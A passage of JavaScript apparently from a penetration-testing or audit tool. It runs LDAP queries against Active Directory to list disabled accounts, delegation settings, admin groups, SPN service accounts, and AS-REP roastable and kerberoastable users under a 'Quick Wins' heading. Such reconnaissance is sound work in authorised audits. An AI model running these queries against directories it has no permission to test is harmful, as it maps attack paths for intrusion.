    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('ok', 'ldap', host, sam, `DISABLED${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'disabled', `${entries.length} disabled account(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'disabled', e.message);
    return null;
  }
}

export async function ldapFuncLevel(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);

    const LEVELS = {
      '0': '2000', '1': '2003 Interim', '2': '2003', '3': '2008',
      '4': '2008 R2', '5': '2012', '6': '2012 R2', '7': '2016',
    };

    const rootDse = [];
    for await (const e of client.search({ baseDN: '', scope: SCOPE.BASE, filter: '(objectClass=*)', attributes: ['domainFunctionality', 'forestFunctionality', 'domainControllerFunctionality', 'dnsHostName', 'serverName'] })) {
      rootDse.push(e);
    }
    if (rootDse.length) {
      const attrs = rootDse[0].attributes || {};
      const dom = attrs.domainFunctionality; const domStr = Array.isArray(dom) ? dom[0] : dom;
      const forest = attrs.forestFunctionality; const forStr = Array.isArray(forest) ? forest[0] : forest;
      const dc = attrs.domainControllerFunctionality; const dcStr = Array.isArray(dc) ? dc[0] : dc;
      const decode = (v) => { const s = v instanceof Uint8Array ? new TextDecoder().decode(v) : String(v || ''); return `${LEVELS[s] || s} (${s})`; };
      log('ok', 'ldap', host, 'domain-level', decode(domStr));
      log('ok', 'ldap', host, 'forest-level', decode(forStr));
      log('ok', 'ldap', host, 'dc-level', decode(dcStr));
    }

    const schema = await searchAll(client, `CN=Schema,CN=Configuration,${base}`, '(objectClass=*)', ['objectVersion'], false);
    if (schema.length) {
      let ver = schema[0].attributes?.objectVersion;
      if (Array.isArray(ver)) ver = ver[0];
      if (ver instanceof Uint8Array) ver = new TextDecoder().decode(ver);
      const SCHEMA_VER = {
        '13': '2000', '30': '2003', '31': '2003 R2', '44': '2008',
        '47': '2008 R2', '56': '2012', '69': '2012 R2', '87': '2016', '88': '2019', '90': '2022',
      };
      log('ok', 'ldap', host, 'schema', `version ${ver} (${SCHEMA_VER[String(ver)] || 'unknown'})`);
    }

    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'func-level', e.message);
    return null;
  }
}

export async function ldapRODC(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))', ['sAMAccountName', 'dNSHostName', 'operatingSystem']);
    if (!entries.length) {
      log('info', 'ldap', host, 'rodc', 'no read-only domain controllers found');
    }
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let dns = e.attributes?.dNSHostName || '';
      if (Array.isArray(dns)) dns = dns[0];
      if (dns instanceof Uint8Array) dns = new TextDecoder().decode(dns);
      let os = e.attributes?.operatingSystem || '';
      if (Array.isArray(os)) os = os[0];
      if (os instanceof Uint8Array) os = new TextDecoder().decode(os);
      log('ok', 'ldap', host, sam, `RODC — ${dns} (${os})`);
    }
    log('ok', 'ldap', host, 'rodc', `${entries.length} RODC(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'rodc', e.message);
    return null;
  }
}

export async function ldapPwdExpired(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName', 'description']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('ok', 'ldap', host, sam, `password must change at next logon${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'pwd-expired', `${entries.length} account(s) with expired passwords`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'pwd-expired', e.message);
    return null;
  }
}

export async function ldapProtectedUsers(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(memberOf=CN=Protected Users,CN=Users,' + base + ')', ['sAMAccountName', 'distinguishedName']);
    if (!entries.length) {
      log('warn', 'ldap', host, 'protected-users', 'Protected Users group is empty — consider adding privileged accounts');
    }
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      log('ok', 'ldap', host, sam, 'member of Protected Users');
    }
    log('ok', 'ldap', host, 'protected-users', `${entries.length} member(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'protected-users', e.message);
    return null;
  }
}

export async function ldapSensitive(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))', ['sAMAccountName', 'description']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('ok', 'ldap', host, sam, `NOT_DELEGATED (sensitive)${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'sensitive', `${entries.length} account(s) marked as sensitive and cannot be delegated`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'sensitive', e.message);
    return null;
  }
}

export async function ldapRecon(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);

    log('info', 'ldap', host, 'recon', '--- Domain Info ---');
    const LEVELS = { '0': '2000', '1': '2003 Interim', '2': '2003', '3': '2008', '4': '2008 R2', '5': '2012', '6': '2012 R2', '7': '2016' };
    for await (const e of client.search({ baseDN: '', scope: SCOPE.BASE, filter: '(objectClass=*)', attributes: ['domainFunctionality', 'forestFunctionality', 'dnsHostName'] })) {
      const a = e.attributes || {};
      const dl = a.domainFunctionality; const d = Array.isArray(dl) ? dl[0] : dl;
      const ds = d instanceof Uint8Array ? new TextDecoder().decode(d) : String(d || '');
      log('ok', 'ldap', host, 'domain-level', `${LEVELS[ds] || ds}`);
    }

    log('info', 'ldap', host, 'recon', '--- Password Policy ---');
    const pol = await searchAll(client, base, '(objectClass=domain)', ['maxPwdAge', 'minPwdLength', 'lockoutThreshold', 'lockoutDuration']);
    if (pol.length) {
      const a = pol[0].attributes || {};
      const decode = (v) => { if (Array.isArray(v)) v = v[0]; if (v instanceof Uint8Array) v = new TextDecoder().decode(v); return v; };
      log('ok', 'ldap', host, 'minPwdLength', decode(a.minPwdLength) || '?');
      log('ok', 'ldap', host, 'lockoutThreshold', decode(a.lockoutThreshold) || '?');
    }

    log('info', 'ldap', host, 'recon', '--- Stats ---');
    const users = await searchAll(client, base, '(&(objectClass=user)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName']);
    log('ok', 'ldap', host, 'enabled users', String(users.length));
    const comps = await searchAll(client, base, '(objectClass=computer)', ['sAMAccountName']);
    log('ok', 'ldap', host, 'computers', String(comps.length));
    const dcs = await searchAll(client, base, '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', ['sAMAccountName']);
    log('ok', 'ldap', host, 'domain controllers', String(dcs.length));

    log('info', 'ldap', host, 'recon', '--- Quick Wins ---');
    const asrep = await searchAll(client, base, '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName']);
    log(asrep.length ? 'warn' : 'ok', 'ldap', host, 'AS-REP roastable', String(asrep.length));
    const spns = await searchAll(client, base, '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName']);
    log(spns.length ? 'warn' : 'ok', 'ldap', host, 'kerberoastable', String(spns.length));
    const pnr = await searchAll(client, base, '(&(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName']);
    log(pnr.length ? 'warn' : 'ok', 'ldap', host, 'PASSWD_NOTREQD', String(pnr.length));
    const pwdExp = await searchAll(client, base, '(&(objectClass=user)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName']);
    log(pwdExp.length ? 'warn' : 'ok', 'ldap', host, 'password expired', String(pwdExp.length));

    const domPol = await searchAll(client, base, '(objectClass=domain)', ['ms-DS-MachineAccountQuota']);
    if (domPol.length) {
      let maq = domPol[0].attributes?.['ms-DS-MachineAccountQuota'];
      if (Array.isArray(maq)) maq = maq[0];
      if (maq instanceof Uint8Array) maq = new TextDecoder().decode(maq);
      const maqVal = parseInt(maq || '0');
      log(maqVal > 0 ? 'warn' : 'ok', 'ldap', host, 'MachineAccountQuota', String(maqVal));
    }

    log('info', 'ldap', host, 'recon', '--- Delegation ---');
    const unconstrained = await searchAll(client, base, '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))', ['sAMAccountName']);
    for (const e of unconstrained) log('warn', 'ldap', host, e.attributes?.sAMAccountName || '?', 'UNCONSTRAINED DELEGATION');
    const constrained = await searchAll(client, base, '(msDS-AllowedToDelegateTo=*)', ['sAMAccountName', 'msDS-AllowedToDelegateTo']);
    for (const e of constrained) {
      const sam = e.attributes?.sAMAccountName || '?';
      let targets = e.attributes?.['msDS-AllowedToDelegateTo'] || [];
      if (!Array.isArray(targets)) targets = [targets];
      log('warn', 'ldap', host, sam, `CONSTRAINED → ${targets.join(', ')}`);
    }

    await client.unbind();
    log('ok', 'ldap', host, 'recon', 'scan complete');
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'recon', e.message);
    return null;
  }
}

export async function ldapExchange(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const configBase = `CN=Configuration,${base}`;
    const entries = await searchAll(client, configBase, '(objectClass=msExchExchangeServer)', ['cn', 'msExchCurrentServerRoles', 'serialNumber', 'msExchProductID']);
    if (!entries.length) {
      log('info', 'ldap', host, 'exchange', 'no Exchange servers found in AD');
    }
    for (const e of entries) {
      let cn = e.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
      let ver = e.attributes?.serialNumber || '';
      if (Array.isArray(ver)) ver = ver[0];
      if (ver instanceof Uint8Array) ver = new TextDecoder().decode(ver);
      let roles = e.attributes?.msExchCurrentServerRoles || '';
      if (Array.isArray(roles)) roles = roles[0];
      if (roles instanceof Uint8Array) roles = new TextDecoder().decode(roles);
      log('ok', 'ldap', host, cn, `Exchange — version: ${ver || 'unknown'}, roles: ${roles || '?'}`);
    }

    const orgEntries = await searchAll(client, configBase, '(objectClass=msExchOrganizationContainer)', ['cn']);
    for (const e of orgEntries) {
      let cn = e.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
      log('ok', 'ldap', host, 'org', cn);
    }

    log('ok', 'ldap', host, 'exchange', `${entries.length} Exchange server(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'exchange', e.message);
    return null;
  }
}

export async function ldapSccm(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    let entries = [];
    try {
      entries = await searchAll(client, base, '(objectClass=mSSMSManagementPoint)', ['cn', 'mSSMSMPName', 'dNSHostName']);
    } catch (e) {
      // A missing schema attribute would be code 17/16; leave that as an error.
      if (!/code 32|noSuchObject/i.test(e.message)) throw e;
    }
    if (!entries.length) {
      let sysEntries = [];
      try {
        sysEntries = await searchAll(client, `CN=System Management,CN=System,${base}`, '(objectClass=*)', ['cn']);
      } catch (e) {
        if (!/code 32|noSuchObject/i.test(e.message)) throw e;
      }
      if (sysEntries.length) {
        log('info', 'ldap', host, 'sccm', 'System Management container exists but no management points found');
      } else {
        log('info', 'ldap', host, 'sccm', 'no SCCM/MECM management points found');
      }
    }
    for (const e of entries) {
      const cn = decodeAttr(e.attributes?.cn) || decodeAttr(e.attributes?.mSSMSMPName) || '?';
      const dns = decodeAttr(e.attributes?.dNSHostName);
      log('ok', 'ldap', host, cn, `SCCM MP — ${dns}`);
    }
    log('ok', 'ldap', host, 'sccm', `${entries.length} management point(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'sccm', e.message);
    return null;
  }
}

export async function ldapStaleComputers(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const now = BigInt(Date.now()) * 10000n + 116444736000000000n;
    const threshold90d = now - 90n * 24n * 60n * 60n * 10000000n;
    const entries = await searchAll(client, base, `(&(objectClass=computer)(lastLogonTimestamp<=${threshold90d}))`, ['sAMAccountName', 'operatingSystem', 'lastLogonTimestamp']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let os = e.attributes?.operatingSystem || '';
      if (Array.isArray(os)) os = os[0];
      if (os instanceof Uint8Array) os = new TextDecoder().decode(os);
      let ll = e.attributes?.lastLogonTimestamp;
      if (Array.isArray(ll)) ll = ll[0];
      if (ll instanceof Uint8Array) ll = new TextDecoder().decode(ll);
      const ts = ll ? formatAdTimestamp(ll) : 'never';
      log('ok', 'ldap', host, sam, `${os || 'unknown OS'} — last logon: ${ts}`);
    }
    log('ok', 'ldap', host, 'stale', `${entries.length} computer(s) inactive >90 days`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'stale', e.message);
    return null;
  }
}

export async function ldapAdminCount(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName', 'memberOf', 'description']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      let memberOf = e.attributes?.memberOf || [];
      if (!Array.isArray(memberOf)) memberOf = [memberOf];
      const groups = memberOf.map(m => {
        const s = m instanceof Uint8Array ? new TextDecoder().decode(m) : String(m);
        const match = s.match(/^CN=([^,]+)/);
        return match ? match[1] : s;
      }).slice(0, 5);
      log('ok', 'ldap', host, sam, `adminCount=1${groups.length ? ' — ' + groups.join(', ') : ''}${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'admin-count', `${entries.length} enabled account(s) with adminCount=1`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'admin-count', e.message);
    return null;
  }
}

export async function ldapServiceAccounts(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName', 'servicePrincipalName', 'pwdLastSet', 'adminCount']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let spns = e.attributes?.servicePrincipalName || [];
      if (!Array.isArray(spns)) spns = [spns];
      spns = spns.map(s => s instanceof Uint8Array ? new TextDecoder().decode(s) : String(s));
      let pwd = e.attributes?.pwdLastSet;
      if (Array.isArray(pwd)) pwd = pwd[0];
      if (pwd instanceof Uint8Array) pwd = new TextDecoder().decode(pwd);
      const ts = pwd ? formatAdTimestamp(pwd) : 'never';
      let admin = e.attributes?.adminCount;
      if (Array.isArray(admin)) admin = admin[0];
      if (admin instanceof Uint8Array) admin = new TextDecoder().decode(admin);
      const isAdmin = admin === '1' ? ' [ADMIN]' : '';
      log('ok', 'ldap', host, sam, `${spns.slice(0, 3).join(', ')}${spns.length > 3 ? ` (+${spns.length - 3})` : ''} — pwdLastSet: ${ts}${isAdmin}`);
    }
    log('ok', 'ldap', host, 'svc-accounts', `${entries.length} service account(s) with SPNs`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'svc-accounts', e.message);
    return null;
  }
}

export async function ldapTrustedDeleg(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))', ['sAMAccountName', 'dNSHostName']);
    for (const e of entries) {
      let sam = e.attributes?.sAMAccountName || '?';
      if (Array.isArray(sam)) sam = sam[0];
      if (sam instanceof Uint8Array) sam = new TextDecoder().decode(sam);
      let dns = e.attributes?.dNSHostName || '';
      if (Array.isArray(dns)) dns = dns[0];
      if (dns instanceof Uint8Array) dns = new TextDecoder().decode(dns);
      log('warn', 'ldap', host, sam, `TRUSTED_FOR_DELEGATION — ${dns}`);
    }
    log('ok', 'ldap', host, 'trusted-deleg', `${entries.length} computer(s) trusted for unconstrained delegation`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'trusted-deleg', e.message);
    return null;
  }
}

export async function ldapSidhist(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(sIDHistory=*))', ['sAMAccountName', 'sIDHistory']);
    for (const e of entries) {
      let sam = e.attributes?.sAMAccountName || '?';
      if (Array.isArray(sam)) sam = sam[0];
      if (sam instanceof Uint8Array) sam = new TextDecoder().decode(sam);
      let hist = e.attributes?.sIDHistory || [];
      if (!Array.isArray(hist)) hist = [hist];
      log('warn', 'ldap', host, sam, `has ${hist.length} SID history entries`);
    }
    if (!entries.length) log('info', 'ldap', host, 'sidhist', 'no accounts with SID history');
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'sidhist', e.message);
    return null;
  }
}

export async function ldapDnsZones(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const configBase = `CN=Configuration,${base}`;
    const zones = await searchAll(client, `CN=MicrosoftDNS,DC=DomainDnsZones,${base}`, '(objectClass=dnsZone)', ['name', 'dc']);
    for (const z of zones) {
      let name = z.attributes?.name || z.attributes?.dc || '?';
      if (Array.isArray(name)) name = name[0];
      if (name instanceof Uint8Array) name = new TextDecoder().decode(name);
      log('ok', 'ldap', host, 'dns-zone', name);
    }

    const fzones = await searchAll(client, `CN=MicrosoftDNS,DC=ForestDnsZones,${base}`, '(objectClass=dnsZone)', ['name', 'dc']);
    for (const z of fzones) {
      let name = z.attributes?.name || z.attributes?.dc || '?';
      if (Array.isArray(name)) name = name[0];
      if (name instanceof Uint8Array) name = new TextDecoder().decode(name);
      log('ok', 'ldap', host, 'forest-dns', name);
    }

    log('ok', 'ldap', host, 'dns-zones', `${zones.length} domain + ${fzones.length} forest zone(s)`);
    await client.unbind();
    return { domain: zones, forest: fzones };
  } catch (e) {
    log('err', 'ldap', host, 'dns-zones', e.message);
    return null;
  }
}

export async function ldapSchemaVersion(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const schema = await searchAll(client, `CN=Schema,CN=Configuration,${base}`, '(objectClass=dMD)', ['objectVersion']);
    if (schema.length) {
      let ver = schema[0].attributes?.objectVersion;
      if (Array.isArray(ver)) ver = ver[0];
      if (ver instanceof Uint8Array) ver = new TextDecoder().decode(ver);
      const versions = { '13': '2000', '30': '2003', '31': '2003 R2', '44': '2008', '47': '2008 R2', '56': '2012', '69': '2012 R2', '87': '2016', '88': '2019', '90': '2022', '91': '2025' };
      log('ok', 'ldap', host, 'schema', `version ${ver} — ${versions[ver] || 'unknown'}`);
    }

    const forest = await searchAll(client, `CN=Partitions,CN=Configuration,${base}`, '(objectClass=crossRefContainer)', ['msDS-Behavior-Version']);
    if (forest.length) {
      let fl = forest[0].attributes?.['msDS-Behavior-Version'];
      if (Array.isArray(fl)) fl = fl[0];
      if (fl instanceof Uint8Array) fl = new TextDecoder().decode(fl);
      const levels = { '0': '2000', '1': '2003 Interim', '2': '2003', '3': '2008', '4': '2008 R2', '5': '2012', '6': '2012 R2', '7': '2016', '10': '2025' };
      log('ok', 'ldap', host, 'forest-level', `${fl} — ${levels[fl] || 'unknown'}`);
    }

    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'schema', e.message);
    return null;
  }
}

export async function ldapLargeGroups(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const groups = await searchAll(client, base, '(objectClass=group)', ['cn', 'member']);
    const big = groups.map(g => {
      let cn = g.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
      let members = g.attributes?.member || [];
      if (!Array.isArray(members)) members = [members];
      return { cn, count: members.length };
    }).filter(g => g.count > 10).sort((a, b) => b.count - a.count);

    for (const g of big.slice(0, 30)) {
      log('ok', 'ldap', host, g.cn, `${g.count} members`);
    }
    log('ok', 'ldap', host, 'large-groups', `${big.length} group(s) with >10 members`);
    await client.unbind();
    return big;
  } catch (e) {
    log('err', 'ldap', host, 'large-groups', e.message);
    return null;
  }
}

export async function ldapEmptyPwd(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(pwdLastSet=0)(!(sAMAccountName=krbtgt)))', ['sAMAccountName', 'description', 'memberOf']);
    for (const e of entries) {
      let sam = e.attributes?.sAMAccountName || '?';
      if (Array.isArray(sam)) sam = sam[0];
      if (sam instanceof Uint8Array) sam = new TextDecoder().decode(sam);
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('warn', 'ldap', host, sam, `pwdLastSet=0 (must change)${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'empty-pwd', `${entries.length} account(s) with no password set`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'empty-pwd', e.message);
    return null;
  }
}

export async function ldapPreWin2k(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(cn=Pre-Windows 2000 Compatible Access)', ['member']);
    if (entries.length && entries[0].attributes?.member) {
      let members = entries[0].attributes.member;
      if (!Array.isArray(members)) members = [members];
      for (const m of members) {
        const s = m instanceof Uint8Array ? new TextDecoder().decode(m) : String(m);
        const match = s.match(/^CN=([^,]+)/);
        const name = match ? match[1] : s;
        const isRisk = name.toLowerCase().includes('authenticated') || name.toLowerCase().includes('everyone') || name.toLowerCase().includes('anonymous');
        log(isRisk ? 'warn' : 'ok', 'ldap', host, 'pre-win2k', name);
      }
    } else {
      log('info', 'ldap', host, 'pre-win2k', 'group not found or empty');
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'pre-win2k', e.message);
    return null;
  }
}

export async function ldapOldPasswords(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const now = BigInt(Date.now()) * 10000n + 116444736000000000n;
    const threshold365d = now - 365n * 24n * 60n * 60n * 10000000n;
    const entries = await searchAll(client, base, `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(pwdLastSet<=${threshold365d})(pwdLastSet>=1))`, ['sAMAccountName', 'pwdLastSet', 'adminCount']);
    for (const e of entries) {
      let sam = e.attributes?.sAMAccountName || '?';
      if (Array.isArray(sam)) sam = sam[0];
      if (sam instanceof Uint8Array) sam = new TextDecoder().decode(sam);
      let pwd = e.attributes?.pwdLastSet;
      if (Array.isArray(pwd)) pwd = pwd[0];
      if (pwd instanceof Uint8Array) pwd = new TextDecoder().decode(pwd);
      let admin = e.attributes?.adminCount;
      if (Array.isArray(admin)) admin = admin[0];
      if (admin instanceof Uint8Array) admin = new TextDecoder().decode(admin);
      const ts = pwd ? formatAdTimestamp(pwd) : 'unknown';
      const isAdmin = admin === '1' ? ' [ADMIN]' : '';
      log('warn', 'ldap', host, sam, `pwd last set: ${ts}${isAdmin}`);
    }
    log('ok', 'ldap', host, 'old-passwords', `${entries.length} account(s) with password >1 year old`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'old-passwords', e.message);
    return null;
  }
}

export async function ldapRecycleBin(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const configBase = `CN=Configuration,${base}`;
    const entries = await searchAll(client, configBase, '(cn=Recycle Bin Feature)', ['msDS-EnabledFeatureBL']);
    const enabled = entries.length && entries[0].attributes?.['msDS-EnabledFeatureBL'];
    if (enabled) {
      log('ok', 'ldap', host, 'recycle-bin', 'AD Recycle Bin is ENABLED');
    } else {
      log('warn', 'ldap', host, 'recycle-bin', 'AD Recycle Bin is NOT enabled');
    }

    // The `CN=Deleted Objects` container only exists when the Recycle Bin
    // feature is enabled AND the caller has "List Contents" access. Treat a
    // noSuchObject (code 32) as an info line, not an error.
    if (enabled) {
      try {
        const deleted = await searchAll(client, `CN=Deleted Objects,${base}`, '(isDeleted=TRUE)', ['cn', 'sAMAccountName', 'whenChanged']);
        log('ok', 'ldap', host, 'deleted', `${deleted.length} deleted object(s) in recycle bin`);
        for (const d of deleted.slice(0, 20)) {
          const cn = decodeAttr(d.attributes?.cn) || decodeAttr(d.attributes?.sAMAccountName) || '?';
          log('ok', 'ldap', host, 'deleted', cn);
        }
      } catch (e) {
        if (/code 32|noSuchObject/i.test(e.message)) {
          log('info', 'ldap', host, 'deleted', 'CN=Deleted Objects not accessible (need "List Contents" on it, or feature genuinely off)');
        } else {
          throw e;
        }
      }
    }

    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'recycle-bin', e.message);
    return null;
  }
}

export async function ldapEnterpriseAdmins(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(cn=Enterprise Admins)', ['member']);
    if (entries.length && entries[0].attributes?.member) {
      let members = entries[0].attributes.member;
      if (!Array.isArray(members)) members = [members];
      for (const m of members) {
        const s = m instanceof Uint8Array ? new TextDecoder().decode(m) : String(m);
        const match = s.match(/^CN=([^,]+)/);
        log('warn', 'ldap', host, 'enterprise-admin', match ? match[1] : s);
      }
      log('ok', 'ldap', host, 'enterprise-admins', `${members.length} member(s)`);
    } else {
      log('info', 'ldap', host, 'enterprise-admins', 'group empty or not found');
    }

    const schemaAdmins = await searchAll(client, base, '(cn=Schema Admins)', ['member']);
    if (schemaAdmins.length && schemaAdmins[0].attributes?.member) {
      let members = schemaAdmins[0].attributes.member;
      if (!Array.isArray(members)) members = [members];
      for (const m of members) {
        const s = m instanceof Uint8Array ? new TextDecoder().decode(m) : String(m);
        const match = s.match(/^CN=([^,]+)/);
        log('warn', 'ldap', host, 'schema-admin', match ? match[1] : s);
      }
      log('ok', 'ldap', host, 'schema-admins', `${members.length} member(s)`);
    }

    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'enterprise-admins', e.message);
    return null;
  }
}

export async function ldapSites(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const configBase = `CN=Configuration,${base}`;
    const sites = await searchAll(client, `CN=Sites,${configBase}`, '(objectClass=site)', ['cn', 'description']);
    for (const s of sites) {
      let cn = s.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
      let desc = s.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('ok', 'ldap', host, 'site', `${cn}${desc ? ' — ' + desc : ''}`);
    }

    const siteLinks = await searchAll(client, `CN=Inter-Site Transports,CN=Sites,${configBase}`, '(objectClass=siteLink)', ['cn', 'cost', 'replInterval']);
    for (const sl of siteLinks) {
      let cn = sl.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
      let cost = sl.attributes?.cost || '?';
      if (Array.isArray(cost)) cost = cost[0];
      if (cost instanceof Uint8Array) cost = new TextDecoder().decode(cost);
      log('ok', 'ldap', host, 'site-link', `${cn} (cost: ${cost})`);
    }

    log('ok', 'ldap', host, 'sites', `${sites.length} site(s), ${siteLinks.length} link(s)`);
    await client.unbind();
    return { sites, siteLinks };
  } catch (e) {
    log('err', 'ldap', host, 'sites', e.message);
    return null;
  }
}

export async function ldapManagedBy(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=group)(managedBy=*))', ['cn', 'managedBy']);
    for (const e of entries) {
      let cn = e.attributes?.cn || '?';
      if (Array.isArray(cn)) cn = cn[0];
      if (cn instanceof Uint8Array) cn = new TextDecoder().decode(cn);
